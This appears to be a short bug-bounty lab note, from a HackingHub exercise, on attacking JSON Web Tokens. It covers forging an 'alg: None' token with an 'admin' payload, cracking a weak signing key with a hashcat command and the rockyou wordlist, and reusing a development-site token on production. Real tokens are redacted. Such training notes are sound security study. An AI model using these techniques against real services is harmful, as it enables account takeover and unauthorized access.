# JWT (HackingHub)

https://jwt.io/

## Bypassing signature checks

[Captura pendiente de revisión: Pasted image 20241216131947.png](../../Resources/Audit/media.csv)
```json
{"typ":"JWT","alg":"None"}
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=

```json
{"username":"admin"}
```
eyJ1c2VybmFtZSI6ImFkbWluIn0=

the same
ODnAXt9IXHDcP17XNR1yqHedzpifSsIejjDujNyiyRI

[Captura pendiente de revisión: Pasted image 20241216132847.png](../../Resources/Audit/media.csv)

## Crackable key

```jwt
<REDACTED_JWT>
```

```bash
hashcat -m 16500 -a 0 jwt.txt /usr/share/seclists/rockyou.txt
```

[Captura pendiente de revisión: Pasted image 20241216133932.png](../../Resources/Audit/media.csv)
## Reuse of JWT

![Pasted image 20241216134846.png](../../assets/images/f5c572860cdaa21887b1.png)

### Development website

Register on development, 

```jwt
<REDACTED_JWT>
```

### Production website

Use the same JWT of development website, 

![Pasted image 20241216134956.png](../../assets/images/a874dc2d2aa94ee6e48d.png)

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | BB/hackinghub/JWT.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

Se han sustituido valores literales de autenticación o direcciones de correo por marcadores. Los detalles sin valores están en [el registro de redacciones](../../Resources/Audit/redactions.csv).

[Índice de categoría](../README.md) · [Inicio](../../README.md)
